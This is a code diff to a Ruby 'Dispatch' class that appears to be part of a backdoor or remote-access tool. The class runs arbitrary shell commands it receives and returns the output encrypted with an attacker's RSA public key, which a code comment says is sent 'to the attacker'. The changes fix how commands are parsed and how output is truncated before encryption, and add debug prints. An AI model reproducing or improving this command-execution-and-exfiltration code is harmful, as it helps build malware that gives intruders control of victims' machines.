@@ -35,8 +35,7 @@ class Dispatch
 			die
 		when "cmd"
 			# Remove `cmd ` from the string, and pass the rest as the command
-			plaintext.slice!(0..3)
-			cmd plaintext
+			cmd plaintext[4..plaintext.length]
 		else
 			"Unknown command."
 		end
@@ -121,6 +120,7 @@ class Dispatch
 	# Run any command and send the result to the attacker.
 
 	def cmd(command)
+		print command
 		begin
 			@response = `#{command}`
 		rescue Exception => e
@@ -150,12 +150,12 @@ class Dispatch
 	# the cipher text.
 
 	def encrypt(data)
-		if ! data.length
-			data = "Nothing here...\n"
-		elsif data.length > 2027
-			data = data.slice!(2047..data.length)
+		# The limit of the encryption scheme is 235 bytes, so if the string is longer than that we need to limit it
+		if data.length > 234
+			data = data[0..234] + "\n"
 		end
 
+		print data.length
 		key = OpenSSL::PKey::RSA.new File.read '../keys/attacker.pub'
 		return key.public_key.public_encrypt(data)
 	end
